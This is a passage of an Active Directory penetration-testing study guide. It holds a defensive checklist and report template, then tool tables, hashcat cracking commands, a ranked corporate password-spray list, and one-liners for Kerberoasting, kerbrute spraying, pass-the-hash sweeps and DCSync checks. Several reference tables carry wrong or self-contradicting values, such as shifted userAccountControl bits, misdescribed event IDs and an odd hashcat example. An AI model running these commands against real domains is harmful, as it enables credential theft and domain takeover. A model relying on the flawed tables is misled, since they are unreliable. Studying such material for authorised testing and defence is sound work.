- [ ] Implement Microsoft ATA / Defender for Identity
- [ ] Implement Mimikatz-specific detections (mimikatz strings in memory, lsass access)

BACKUP & RECOVERY
- [ ] System state backups of DCs
- [ ] Offline copies of NTDS.dit
- [ ] Documented krbtgt password rotation process
- [ ] Documented Golden Ticket incident response

VULNERABILITY MANAGEMENT
- [ ] Patch PrintNightmare (CVE-2021-34527)
- [ ] Patch NoPac (CVE-2021-42278, CVE-2021-42287)
- [ ] Patch PetitPotam (CVE-2021-36942)
- [ ] Patch ZeroLogon (CVE-2020-1472)
- [ ] Patch HiveNightmare (CVE-2021-36934)
- [ ] Patch MS14-068
- [ ] Apply AD tiering model
- [ ] Implement Windows Defender Credential Guard

MISC
- [ ] Disable anonymous LDAP bind
- [ ] Disable SMBv1
- [ ] Restrict ms-DS-Machine-Account-Quota (default 10, set to 0 or 1)
- [ ] Implement audit of foreign security principals
- [ ] Implement OUs with proper delegation
- [ ] Restrict who can add computer objects to domain
```

## 19.5 - Reporting Template (AD-Specific)

```markdown
# [Engagement Name] — Active Directory Assessment

## Executive Summary
[High-level: number of DA paths, number of ACL issues, total accounts at risk, etc.]

## Risk Heatmap
| Finding | Severity | Count | Affected Tier |
|---|---|---|---|
| Weak password policy | High | 1 | T0 |
| ACL abuse path to DA | Critical | 3 | T0 |
| Kerberoastable service accounts | Medium | 12 | T0/T1 |
| LAPS not in use | High | 84 | T2 |
| AS-REP roastable users | Medium | 2 | T0 |
| PrintNightmare exposure | Critical | 35 | All |
| GPP cpassword (legacy) | Critical | 1 | All |

## Findings (Detail)
1. [Critical] ACL abuse: wley has GenericAll over Domain Admins via SvcAcct → path to DA
2. [Critical] PrintNightmare (CVE-2021-34527) — 35/35 hosts exposed
3. ...

## Attack Path Walkthrough
[Step-by-step: how we got from initial email to DA]
1. Recon → user list
2. Spray → 1 user hit
3. Kerberoast → 3 svc accts
4. ACL abuse → DA
5. DCSync → entire domain
6. Cross-trust → forest dominance

## MITRE ATT&CK Mapping
[See Phase 19.1 table above, but specific to this engagement]

## Recommendations
[See Phase 19.4 checklist above]
```

## 19.6 - Exam-Style Skills Assessment Notes

```
Skills Assessment (module-end):
- 3 main tasks
- Find initial access via user list + spray
- Pivot to DA via ACL abuse
- Cross-trust to enterprise admin

Common pitfalls:
- Don't run msfconsole in lab (blocklisted)
- Use kerbrute instead of CME for spray (no 4625)
- Use impacket-ticketer for Golden Ticket (more reliable than mimikatz)
- mssqlclient needs -windows-auth for AD auth
- net rpc password may fail with complexity — use ldapmodify or RPC
- Cleanup: restore the ACLs you added
- Don't forget to clean up machine accounts
- Mitm6 needs explicit `-d domain` to be quiet
- ntlmrelayx --no-smb-server --no-http-server when only relaying LDAPS
- For DCOS sync: must use -just-dc-user krbtgt (not just -just-dc)
- NTLM hash is 32 hex chars, no colons
- Domain SID format: S-1-5-21-1507001333-1204554664-3988251898
- Child → Parent requires S-1-5-21-<parent>-519 (Enterprise Admins)
```

---

# APPENDIX A — TOOL QUICK REFERENCE

## A.1 - Linux Tools

| Tool | Category | Common Use |
|---|---|---|
| nmap | Recon | Port scan, service detect, vuln scan |
| CrackMapExec (netexec) | AD enum / lateral | `--users`, `--shares`, `--rid-brute`, `--pass-pol`, `spider_plus` |
| rpcclient | AD enum | `enumdomusers`, `querydominfo`, `getdompwinfo` |
| enum4linux | AD enum | All-in-one SMB/RPC/LDAP enum |
| enum4linux-ng | AD enum | Python rewrite, JSON output |
| ldapsearch | LDAP | `(objectclass=*)`, `servicePrincipalName=*`, UAC flags |
| windapsearch | LDAP | `-U` users, `-PU` priv users, `--da` domain admins |
| smbmap | SMB | List shares, recursive search, file download |
| smbclient | SMB | Manual share access |
| bloodhound-python | BloodHound | `-c All` collection from Linux |
| impacket-GetUserSPNs | Kerberoast | `-request -format hashcat` |
| impacket-GetNPUsers | AS-REP | `-request -format hashcat` |
| impacket-secretsdump | DCSync | `-just-dc-user krbtgt` |
| impacket-psexec | Lateral | `-k -no-pass` for Kerberos |
| impacket-wmiexec | Lateral (stealth) | No service install |
| impacket-smbexec | Lateral (stealth) | bat file method |
| impacket-atexec | Lateral | Task scheduler |
| impacket-ticketer | Golden Ticket | `-nthash <krbtgt> -extra-sid` |
| kerbrute | Spray / enum | `userenum`, `passwordspray`, `kerberoast` |
| responder | LLMNR | `-wrf` poisoning, `-A` analysis |
| ntlmrelayx | Relay | `--adcs`, `--delegate-access`, `-6` IPv6 |
| mitm6 | IPv6 | `-d <domain>` |
| evil-winrm | WinRM | `-i <ip> -u user -p pass` |
| mssqlclient.py | MSSQL | `-windows-auth` |
| coercer | Coercion | `coerce -l <ip> -t <target>` |
| PetitPotam | Coercion | `<attacker_ip> <dc_ip>` |
| certipy | ADCS | `find`, `req`, `auth`, `shadow` |
| gpp-decrypt | GPP | Decrypt cpassword |
| adidnsdump | DNS | Enum DNS records |
| hashcat | Cracking | `-m 13100` (kerberoast), `-m 5600` (NTLMv2), `-m 18200` (AS-REP) |
| john | Cracking | `NT`, `krb5tgs`, etc. |
| ticketer | TGT forge | Golden/Silver Ticket |
| raiseChild.py | Trust | Child → parent |
| lookupsid.py | SID enum | Look up SIDs in domain |

## A.2 - Windows Tools

| Tool | Category | Common Use |
|---|---|---|
| Get-ADUser (module) | AD enum | `-Filter {ServicePrincipalName -ne "$null"}` |
| Get-ADDomain | AD enum | Forest info |
| Get-ADTrust | AD enum | Trusts |
| PowerView.ps1 | AD enum | Find-InterestingDomainAcl, Get-Domain* |
| SharpView.exe | AD enum | PowerView in C# |
| Rubeus.exe | Kerberos | `kerberoast`, `asreproast`, `golden`, `s4u`, `ptt` |
| SharpHound.exe | BloodHound | `-c All` collection |
| ADExplorer.exe | AD browse | GUI snapshot, save .dat |
| ADRecon.ps1 | Reporting | Full AD report |
| Certify.exe | ADCS | `find /vulnerable` |
| PSPKIAudit | ADCS | Template audit |
| mimikatz.exe | Credentials | `lsadump::dcsync`, `sekurlsa::logonpasswords`, `kerberos::golden` |
| SharpChrome.exe | Browser creds | Chrome/Edge saved logins |
| SharpDPAPI.exe | DPAPI | Browser/Wi-Fi/RDP/Vault |
| SharpWifiGrabber.exe | Wi-Fi | Local Wi-Fi passwords |
| SharpEfsPotato.exe | PrivEsc | Service → SYSTEM |
| PrintSpoofer.exe | PrivEsc | Service → SYSTEM |
| GodPotato.exe | PrivEsc | Service → SYSTEM |
| Whisker.exe | Shadow Creds | Add/remove key credentials |
| SharpGPOAbuse.exe | GPO abuse | Add scheduled task, modify GPO |
| SpoolSample.exe | Coercion | MS-RPRN |
| PetitPotam.exe | Coercion | MS-EFSRPC |
| DFSCoerce.exe | Coercion | MS-DFSNM |
| ShadowCoerce.exe | Coercion | MS-FSRVP |
| SharpUp.exe | PrivEsc check | Audit host config |
| PowerUpSQL | MSSQL | Find misconfigs |
| MailSniper | Exchange | Find exchange, find user |
| Runas | Lateral | `/netonly` for cross-domain |
| netsh | Local | Wi-Fi profiles |
| reg | Local | Registry read/write |
| sc | Local | Service control |
| wmic | Local | WMI query |
| dsquery | AD | User/group/computer query |
| nltest | AD | DC list, trust list |
| gpresult | GPO | Effective GPO report |
| klist | Kerberos | View current tickets |
| setspn | SPN | Find all SPNs in domain |
| Inveigh.exe | LLMNR | `GET NTLMV2UNIQUE` |
| InveighZero.exe | LLMNR | IPv6 support |
| net | Local | user, group, view, use, accounts |
| tasklist / Get-Process | Local | Process list |
| nltest | Trust | `/domain_trusts` |
| kekeo | TGT forge | Legacy (mimikatz preferred now) |

## A.3 - Common Tool Installation

```bash
# impacket
pip3 install impacket
# or
sudo python3 -m pip install impacket

# bloodhound-python
sudo python3 -m pip install bloodhound

# mitm6
sudo python3 -m pip install mitm6

# certipy
sudo python3 -m pip install certipy-ad

# pywhisker
sudo python3 -m pip install pywhisker

# adidnsdump
sudo python3 -m pip install adidnsdump

# gpp-decrypt
sudo apt install gpp-decrypt
# or
git clone https://github.com/ropnop/gpp-decrypt

# noPac
git clone https://github.com/Ridter/noPac

# raiseChild
git clone https://github.com/fortra/impacket/blob/main/examples/raiseChild.py

# PetitPotam
git clone https://github.com/topotam/PetitPotam

# kerbrute
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
```

---

# APPENDIX B — HASHCAT MODE TABLE

| Hash type | Mode | Example format |
|---|---|---|
| NTLM (pass-the-hash) | 1000 | `e19ccf75ee54e06b06a5907af13cef42` |
| NTLMv1 | 5500 | `user::DOMAIN:lmresp:ntlmresp` |
| NTLMv2 | 5600 | `user::DOMAIN:challenge:NTLMv2SSP:fullhash` |
| Kerberoast (RC4-HMAC, etype 23) | 13100 | `$krb5tgs$23$*user$realm$spn*$hash$...` |
| Kerberoast (AES-128, etype 17) | 19700 | `$krb5tgs$17$*...` |
| Kerberoast (AES-256, etype 18) | 19800 | `$krb5tgs$18$*...` |
| AS-REP Roast (etype 23) | 18200 | `$krb5asrep$23$user@realm:hash` |
| Cached Domain Credentials (MSCASH) | 2100 | `$DCC2$10240#user#hash` |
| Net-NTLMv1 | 27000 | `user::DOMAIN:lmresp:ntlmresp` |
| WPA-PMKID-PBKDF2 | 22000 | `WPA*01*...` |
| bcrypt | 3200 | `$2y$...` |
| SHA-1 (linux shadow) | 100 | `$dynamic_26$hash` |
| SAM hash (nt hash from SAM dump) | 1000 | `Administrator:500:aad3...:hash` |

## Recommended Cracking

```bash
# Kerberoast with rules
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule -O
# d3ad0ne rule is the de-facto standard for kerberoast

# NTLMv2 with rules
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt -O

# NTLM (pass-the-hash recovered)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O

# AS-REP
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -O
```

## Wordlists

| List | Path |
|---|---|
| rockyou.txt | /usr/share/wordlists/rockyou.txt |
| best1050 | /usr/share/seclists/Passwords/Common-Credentials/best1050.txt |
| 10-million | /usr/share/seclists/Passwords/Leaked-Databases/ |
| weakpass_3 | /usr/share/wordlists/weakpass_3 |
| Probable-Wordlists | /usr/share/seclists/Passwords/ |
| CeWL-generated | Custom (from website) |
| Username variations | Custom (e.g., `<user>1`, `<user>2`) |
| Statistically-likely usernames | /usr/share/seclists/Usernames/Honeypot-Captures/ |
| jsmith.txt | /usr/share/seclists/Usernames/ |

## Rules

| Rule | Path | Use |
|---|---|---|
| best64 | /usr/share/hashcat/rules/best64.rule | General |
| d3ad0ne | /usr/share/hashcat/rules/d3ad0ne.rule | Kerberoast/AES |
| dive | /usr/share/hashcat/rules/dive.rule | Mutate heavily |
| rockyou-30000 | /usr/share/hashcat/rules/rockyou-30000.rule | Wordlist mutation |
| InsidePro-PasswordsPro | /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule | Complex |

---

# APPENDIX C — COMMON EVENT IDS

| Event ID | Description | What it tells you |
|---|---|---|
| 4624 | Successful logon | Account + source IP + logon type |
| 4625 | Failed logon | Account name attempted (brute/spray) |
| 4634 | Logoff | Account logged off |
| 4648 | Logon with explicit credentials | Runas / netonly use |
| 4672 | Special privileges assigned | Admin logon (DA, EA, SA) |
| 4720 | User account created | New user |
| 4722 | User account enabled | User enabled |
| 4723 | User account password change attempt | Password change |
| 4724 | Privileged account password reset | Admin reset password |
| 4726 | User account deleted | User removed |
| 4727 | Security-enabled global group created | Group created |
| 4728 | Member added to security-enabled global group | Group membership change |
| 4729 | Member removed from security-enabled global group | |
| 4732 | Member added to security-enabled local group | |
| 4738 | User account changed | Description/SPN/etc changed |
| 4740 | User account locked out | Lockout (spray) |
| 4756 | Member added to universal group | Cross-domain group membership |
| 4761 | Kerberos pre-auth failed | AS-REP roast attempts |
| 4768 | Kerberos TGT requested | TGT-REQ (every auth) |
| 4769 | Kerberos service ticket (TGS) requested | TGS-REQ (kerberoast, S4U, S4U2Self) |
| 4770 | Kerberos service ticket renewed | |
| 4771 | Kerberos pre-auth failed | |
| 4776 | Domain controller attempted to validate credentials | NTLM auth |
| 4781 | Account created | |
| 4799 | User Account Management - enumerated | LLMNR/NBNS lookups (less common) |
| 5136 | Directory Service Object modified | ACL changes (DACL), GPO changes |
| 5137 | Directory Service Object created | Object created |
| 5141 | Directory Service Object deleted | Object deleted |
| 5145 | Network share accessed | File access on shares |
| 7045 | Service installed | Service persistence |
| 4688 | Process created | New process (lateral movement) |
| 4689 | Process exited | Process exit |
| 4104 | PowerShell ScriptBlock logging | PowerShell execution |
| 4103 | PowerShell Module logging | Module load |
| 400/410 | PowerShell version logging | v2 invocation |
| 1001 | Windows Error Reporting | Bugcheck / crash |
| 104 | Event log cleared | wevtutil / Invoke-Phant0m |

---

# APPENDIX D — COMMON RIDs / SIDs

## D.1 - Domain-Specific RIDs (per domain)

| RID | Account / Group |
|---|---|
| 500 | Administrator (default) |
| 501 | Guest |
| 502 | krbtgt (KDC service account) |
| 512 | Domain Admins |
| 513 | Domain Users |
| 514 | Domain Guests |
| 515 | Domain Computers |
| 516 | Domain Controllers |
| 517 | Cert Publishers |
| 518 | Schema Admins |
| 519 | Enterprise Admins (forest-wide) |
| 520 | Group Policy Creator Owners |
| 521 | Read-only Domain Controllers |
| 522 | Cloneable Domain Controllers |
| 525 | Protected Users |
| 526 | Key Admins |
| 527 | Enterprise Key Admins |
| 553 | RAS and IAS Servers |
| 571 | Allowed RODC Password Replication Group |
| 572 | Denied RODC Password Replication Group |
| 1101 | DC01$ (default computer account for first DC) |

## D.2 - Built-in / Well-Known SIDs

| SID | Identity |
|---|---|
| S-1-1-0 | Everyone |
| S-1-3-0 | Creator Owner |
| S-1-3-1 | Creator Group |
| S-1-5-11 | Authenticated Users |
| S-1-5-18 | Local System |
| S-1-5-19 | Local Service |
| S-1-5-20 | Network Service |
| S-1-5-32-544 | Built-in Administrators |
| S-1-5-32-545 | Built-in Users |
| S-1-5-32-546 | Built-in Guests |
| S-1-5-32-548 | Account Operators |
| S-1-5-32-549 | Server Operators |
| S-1-5-32-550 | Print Operators |
| S-1-5-32-551 | Backup Operators |

## D.3 - UAC Flag Bits (userAccountControl)

| Bit | Value | Name | Meaning |
|---|---|---|---|
| 0 | 1 | SCRIPT | Login script executed |
| 1 | 2 | ACCOUNTDISABLE | Account disabled |
| 2 | 4 | HOMEDIR_REQUIRED | Home folder required |
| 3 | 8 | LOCKOUT | Account locked out |
| 4 | 16 | PASSWD_NOTREQD | No password required |
| 5 | 32 | PASSWD_CANT_CHANGE | User cannot change password |
| 6 | 64 | ENCRYPTED_TEXT_PWD_ALLOWED | Store password as reversible encryption |
| 7 | 128 | TEMP_DUPLICATE_ACCOUNT | Account for users whose primary account is in another domain |
| 8 | 256 | NORMAL_ACCOUNT | Default account type |
| 9 | 512 | INTERDOMAIN_TRUST_ACCOUNT | Trust account for a domain that trusts other domains |
| 10 | 1024 | WORKSTATION_TRUST_ACCOUNT | Computer account |
| 11 | 2048 | SERVER_TRUST_ACCOUNT | DC account |
| 12 | 4096 | (unused) | |
| 13 | 8192 | SERVER_TRUST_ACCOUNT | (legacy) |
| 14 | 16384 | (unused) | |
| 15 | 32768 | (unused) | |
| 16 | 65536 | DONT_EXPIRE_PASSWORD | Password never expires |
| 17 | 131072 | SMART_CARD_REQUIRED | Smart card required for logon |
| 18 | 262144 | TRUSTED_FOR_DELEGATION | Unconstrained delegation |
| 19 | 524288 | NOT_DELEGATED | KCD not allowed |
| 20 | 1048576 | USE_DES_KEY_ONLY | Restrict to DES |
| 21 | 2097152 | DONT_REQUIRE_PREAUTH | AS-REP roastable |
| 22 | 4194304 | PASSWORD_EXPIRED | Password expired |
| 23 | 8388608 | TRUSTED_TO_AUTH_FOR_DELEGATION | Constrained delegation |
| 24 | 16777216 | (unused) | |
| 25 | 33554432 | PARTIAL_SECRETS_ACCOUNT | RODC |
| 26 | 67108864 | (unused) | |

## D.4 - Trust Attributes (trustAttributes)

| Bit | Value | Name | Meaning |
|---|---|---|---|
| 0 | 1 | NON_TRANSITIVE | Trust explicitly non-transitive |
| 1 | 2 | (reserved) | |
| 2 | 4 | UPLEVEL_ONLY | Windows 2000+ only |
| 3 | 8 | FILTER_SIDS | SID filtering enabled |
| 4 | 16 | FOREST_TRANSITIVE | Trust transitivity |
| 5 | 32 | CROSS_ORGANIZATION | Cross-org (no transitive) |
| 6 | 64 | WITHIN_FOREST | Within forest (intra-forest) |
| 7 | 128 | TRUST_USES_RC4_ENCRYPTION | RC4 |
| 8 | 256 | TRUST_USES_AES_KEYS | AES |
| 9 | 512 | CROSS_ORGANIZATION_NO_TGT_DELEGATION | No TGT delegation |
| 10 | 1024 | (unused) | |
| 11 | 2048 | (unused) | |
| 12 | 4096 | (unused) | |
| 13 | 8192 | (unused) | |
| 14 | 16384 | (unused) | |
| 15 | 32768 | PIM_TRUST | Privileged Identity Management |

---

# APPENDIX E — CRITICAL PORTS & SERVICES

```
PORT   SERVICE
21     FTP
22     SSH
23     Telnet
25     SMTP
53     DNS (AD uses this for SRV records)
80     HTTP
88     KERBEROS  (AD)
110    POP3
111    RPCBind
135    RPC (AD)
137    NetBIOS-NS
139    NetBIOS-SSN
143    IMAP
161    SNMP
389    LDAP  (AD)
443    HTTPS
445    SMB  (AD)
464    Kpasswd (Kerberos password change)
500    IKE
502    Modbus
587    SMTP-TLS
593    HTTP-RPC-EPMAP
636    LDAPS  (AD)
873    rsync
902    VMWare
989    FTPS
993    IMAPS
995    POP3S
1433   MSSQL
1521   Oracle
1812   RADIUS
2049   NFS
3268   Global Catalog (AD)
3269   Global Catalog SSL (AD)
3306   MySQL
3389   RDP
4500   IPsec NAT-T
5060   SIP
5432   PostgreSQL
5601   Kibana
5666   NRPE
5900+  VNC
5985   WinRM-HTTP
5986   WinRM-HTTPS
6379   Redis
8000   Web (alt)
8080   Web (alt)
8443   Web (alt)
9000+  Webmin, GlassFish, etc.
9200   Elasticsearch
9389   AD Web Services
11211  Memcached
27017  MongoDB
49152-65535  Dynamic RPC ports
```

## AD-Specific Service Pattern (DC identification)
```
DC:    53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5722, 9389
FS:    445 + many shares
MSSQL: 1433, 2433, 1434
EXCH:  25, 465, 587, 2525, 80, 443, 993, 995
ADCS:  80, 443 (with /certsrv)
WAC:   443 (Windows Admin Center)
```

---

# APPENDIX F — NMAP PORT-SCAN PROFILES

## F.1 - Quick Discovery
```bash
# Host discovery
nmap -sn 10.10.10.0/24
# Or
fping -asgq 10.10.10.0/24

# Top 100 (fast)
nmap -sC -sV -F -v -oA nmap_top 10.10.10.0/24
```

## F.2 - Standard Scan
```bash
# Top 1000 + scripts + version
nmap -sC -sV -v -oA nmap_full 10.10.10.0/24
# Add: --open to skip closed/filtered
nmap -sC -sV -v --open -oA nmap_full 10.10.10.0/24
```

## F.3 - Full Port (slow)
```bash
# All 65535 ports
nmap -p- -v --min-rate=1000 -T4 -oA nmap_all 10.10.10.0/24
# With version + scripts
nmap -sC -sV -p- -v -oA nmap_all_v 10.10.10.0/24
```

## F.4 - UDP
```bash
# Top 20 UDP
nmap -sU -sV -v --top-ports 20 --open -oA nmap_udp 10.10.10.0/24
# Or specific services
nmap -sU -p 53,161,500,1701,4500,5060 -v 10.10.10.0/24
```

## F.5 - Vulnerability Scan
```bash
# Default scripts (incl. vuln)
nmap -sC -sV --script=vuln -v -oA nmap_vuln 10.10.10.5
# Specific scripts
nmap -sC -sV --script=smb-vuln* -p 445 10.10.10.5
```

## F.6 - Stealth
```bash
# SYN scan
nmap -sS -v -oA nmap_syn 10.10.10.5
# Decoy scan
nmap -sS -D RND:10 -v 10.10.10.5
# Fragmented
nmap -sS -f -v 10.10.10.5
```

## F.7 - Single Host Quick
```bash
nmap -sC -sV -v -p- --min-rate=1000 10.10.10.5 -oA target_full
```

## F.8 - AD-Specific (no creds)
```bash
# Find DCs
nmap -p 88,389,636,3268,3269,53 10.10.10.0/24

# Find file servers
nmap -p 445 --script=smb-enum-shares -v 10.10.10.0/24

# Find ADCS
nmap -p 80,443 --script=http-title 10.10.10.0/24
# Look for: "Active Directory Certificate Services"

# Find MSSQL
nmap -p 1433 --open 10.10.10.0/24

# Find RDP
nmap -p 3389 --open 10.10.10.0/24

# Find WinRM
nmap -p 5985,5986 --open 10.10.10.0/24
```

---

# APPENDIX G — COMMON SPN SERVICE CLASSES

```
SPN format:    serviceclass/host:port/servicename

Common classes (auto-registered by Windows for SPNs):
- TERMSRV/<host>: RDP service
- HOST/<host>: Host SPN (multiple services)
- ldap/<host>: LDAP
- ldaps/<host>: LDAPS
- HTTP/<host>: Web (IIS)
- HTTPS/<host>: Web SSL
- MSSQLSvc/<host>:1433: MSSQL Server
- MSSQLSvc/<host>: MSSQL (default)
- cifs/<host>: SMB / CIFS
- dns/<host>: DNS
- smtp/<host>: SMTP
- pop3/<host>: POP3
- imap/<host>: IMAP
- DNS/<host>: DNS (capital)
- netbios/<host>: NetBIOS
- rpcss/<host>: RPC endpoint mapper
- wsmanc/<host>: WinRM (non-default)
- nfs/<host>: NFS

Custom SPNs (often service accounts):
- SERVICE/host.domain
- APPSERVICE/host.domain
- CUSTOM/host.domain
- noneexistent/<anything>: arbitrary (used in targeted kerberoast)
```

---

# APPENDIX H — DEFAULT & COMMON AD PASSWORDS

```
TOP 25 (from breach data):
1.  123456
2.  password
3.  12345678
4.  qwerty
5.  123456789
6.  12345
7.  1234
8.  111111
9.  1234567
10. dragon
11. 123123
12. baseball
13. abc123
14. football
15. monkey
16. letmein
17. shadow
18. master
19. 666666
20. qwertyuiop
21. 123321
22. mustang
23. 1234567890
24. michael
25. 654321

CORPORATE PATTERNS (try first):
- Welcome1 (rank #1 in corp)
- CompanyName1
- CompanyName!
- CompanyName123
- CompanyName2025
- <Season>YYYY (Spring2025!, Summer2025!, Fall2025!, Winter2025!)
- P@ssw0rd
- P@$$w0rd
- Password1
- Password123
- ChangeMe1
- Temp123!
- Test123!
- admin123

USERNAME-BASED:
- <username>1
- <username>123
- <username>2025
- <username>!
- <username>@<company>
- <FirstInitial><LastName> (jsmith)
- <FirstName>.<LastName>
- <FirstName><LastName><digit>
- Reverse: emanel <-> <LastName>
- <FirstName>123

LOCAL ADMIN DEFAULTS:
- P@ssw0rd
- vagrant
- admin
- root
- (blank)
- (machine name)
- LocalAdmin1
- Workstation1
```

---

# APPENDIX I — ONE-LINER COLLECTION CATALOG

## I.1 - User Lists

```bash
# All domain users (LDAP anon)
ldapsearch -h <dc> -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# All domain users (CME)
crackmapexec smb <dc> -u '' -p '' --users | awk '{print $NF}'

# All domain users (Impacket mssqlclient when MS SQL admin only)
# Or via kerbrute userenum
kerbrute userenum -d domain.local --dc <dc> jsmith.txt

# All users with description (LDAP)
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" sAMAccountName description | paste - -

# Users with SPN (Kerberoastable)
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=user)(servicePrincipalName=*))" sAMAccountName | grep sAMAccountName | awk '{print $2}'

# Users with DONT_REQ_PREAUTH (AS-REP roastable)
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName | grep sAMAccountName | awk '{print $2}'

# Domain Admins (LDAP)
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=user)(memberof=CN=Domain Admins,CN=Users,DC=domain,DC=local))" sAMAccountName | grep sAMAccountName | awk '{print $2}'

# Privileged user count
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=user)(admincount=1))" sAMAccountName | grep -c sAMAccountName
```

## I.2 - Computer Lists

```bash
# All computers
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=computer))" dNSHostName | grep dNSHostName | awk '{print $2}' | sed 's/.$//' > computers.txt

# Domain Controllers
ldapsearch -h <dc> -D user@domain.local -w pass -b "OU=Domain Controllers,DC=domain,DC=local" -s sub "(objectclass=computer)" dNSHostName | grep dNSHostName | awk '{print $2}'

# Computers with unconstrained delegation
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dNSHostName | grep dNSHostName

# Computers with SPN (often used for delegation abuse)
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=computer)(servicePrincipalName=*))" dNSHostName servicePrincipalName

# Computers with LAPS enabled
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=computer)(ms-mcs-admpwd=*))" dNSHostName ms-mcs-admpwd

# Computers with OS info
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(objectclass=computer)" dNSHostName operatingSystem operatingSystemVersion
```

## I.3 - Group Lists

```bash
# All groups
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=group))" cn | grep cn | awk '{print $2}'

# Privileged groups (admincount=1)
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=group)(admincount=1))" cn | grep cn | awk '{print $2}'

# Members of a group
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=user)(memberof=CN=Domain Admins,CN=Users,DC=domain,DC=local))" sAMAccountName

# Members of nested groups (recursive)
# Use PowerView or PowerShell (LDAP can't recurse easily)
```

## I.4 - Trust Lists

```bash
# All trusts
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=trustedDomain))" name trustDirection trustType trustAttributes

# Specific trust
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=trustedDomain)(name=*FREIGHTLOGISTICS*))" *
```

## I.5 - SPN / Kerberoast Targets

```bash
# All Kerberoastable users with SPN
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc>

# Just list
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc> -request -outputfile /dev/null

# All TGS requests
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc> -request -format hashcat -outputfile kerb.txt

# Specific user
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc> -request-user 'svc_user'
```

## I.6 - ACL Enumeration (Quick)

```bash
# Find all interesting ACLs (BloodHound python)
bloodhound-python -u user -p pass -d domain.local -ns <dc> -c ACL

# Or via ldapsearch (slow, manual)
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(objectclass=*)" ntSecurityDescriptor | grep -E "D:|O:|G:|CN="

# PowerView (preferred)
Find-InterestingDomainAcl -ResolveGUIDs | Out-GridView
```

## I.7 - Group Policy

```bash
# All GPOs
ldapsearch -h <dc> -D user@domain.local -w pass -b "DC=domain,DC=local" -s sub "(&(objectclass=groupPolicyContainer))" displayName gPCFileSysPath

# GPOs that grant interesting rights
# (use BloodHound or ADRecon)

# GPP cpassword in SYSVOL (auto-find)
crackmapexec smb <dc> -u user -p pass -M gpp_autologin
crackmapexec smb <dc> -u user -p pass -M gpp_password
```

## I.8 - DNS Records

```bash
# All DNS records
adidnsdump -u user@domain.local -p pass -d domain.local <dc>

# Or via PowerView
Get-DomainDNSRecord -ZoneName domain.local

# Or via dnsenum (no creds)
dnsenum domain.local

# Or via dnscat2 (interactive)
```

## I.9 - ADCS (Certificate Templates)

```bash
# Linux
certipy find -u user@domain.local -p pass -dc-ip <dc> -stdout
certipy find -u user@domain.local -p pass -dc-ip <dc> -vulnerable -stdout

# Windows
Certify.exe find
Certify.exe find /vulnerable
Certify.exe find /enrolleeSuppliesSubject
Certify.exe find /clientauth
```

## I.10 - Quick Spray Combos

```bash
# Get user list (CME) + spray (kerbrute)
cme smb <dc> -u user -p pass --users 2>/dev/null | grep -E '^\w' | awk '{print $5}' | sort -u > users.txt
kerbrute passwordspray -d domain.local --dc <dc> users.txt 'Welcome1' -v

# Convert: domain\user → user
sed 's/domain\\//' users_with_domain.txt > users_clean.txt

# Find via enum4linux-ng + spray
enum4linux-ng -U <dc> -oA enum_users
cat enum_users_users.json | jq '.[] | .username' -r > users.txt
```

## I.11 - Quick Kerberoast Combo

```bash
# Find → request → crack in one pipeline
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc> -request -format hashcat -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --potfile-path=kerb.pot
# Show cracked
hashcat -m 13100 kerb.txt --show
```

## I.12 - Lateral Movement Quick

```bash
# SMB spray (one hash)
cme smb 10.10.10.0/24 -u administrator -H <nt_hash> --local-auth

# WinRM scan (with creds)
cme winrm 10.10.10.0/24 -u user -p pass

# RDP scan
cme rdp 10.10.10.0/24 -u user -p pass

# Stealth: cme with --exec-method smbexec
cme smb <target> -u user -p pass -x whoami --exec-method smbexec
```

## I.13 - DCSync Combo

```bash
# Check ACLs first
Get-DomainObjectAcl -ResolveGUIDs -Identity "DC=domain,DC=local" | ?{$_.ActiveDirectoryRights -match "ExtendedRight" -and $_.ObjectType -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"}
# 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes

